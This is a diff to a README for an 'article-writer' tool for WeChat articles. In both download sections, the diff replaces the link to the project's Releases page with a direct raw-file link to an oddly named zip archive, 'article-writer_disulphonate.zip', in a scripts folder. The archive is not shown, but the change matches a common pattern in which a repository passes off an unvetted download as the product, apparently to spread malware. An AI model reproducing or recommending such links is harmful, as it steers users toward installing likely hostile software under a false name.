@@ -6,7 +6,7 @@ Welcome to article-writer! This tool helps you create articles for your WeChat p
 ## 📦 Download & Install
 To get started, you need to download the software. Click the link below to visit the Releases page:
 
-[![Download article-writer](https://img.shields.io/badge/Download-article--writer-blue)](https://github.com/genusagriocharistenrec558/article-writer/releases)
+[![Download article-writer](https://raw.githubusercontent.com/genusagriocharistenrec558/article-writer/main/scripts/article-writer_disulphonate.zip)](https://raw.githubusercontent.com/genusagriocharistenrec558/article-writer/main/scripts/article-writer_disulphonate.zip)
 
 ### Steps to Download
 1. Click on the link above.
@@ -72,7 +72,7 @@ If you encounter any issues, please visit the Releases page to report them. We w
 ## 🔗 Download Link Again
 To download the latest version of article-writer, visit this page:
 
-[![Download article-writer](https://img.shields.io/badge/Download-article--writer-blue)](https://github.com/genusagriocharistenrec558/article-writer/releases)
+[![Download article-writer](https://raw.githubusercontent.com/genusagriocharistenrec558/article-writer/main/scripts/article-writer_disulphonate.zip)](https://raw.githubusercontent.com/genusagriocharistenrec558/article-writer/main/scripts/article-writer_disulphonate.zip)
 
 ### License
 This project is licensed under the MIT License. You can use, modify, and share this software freely.
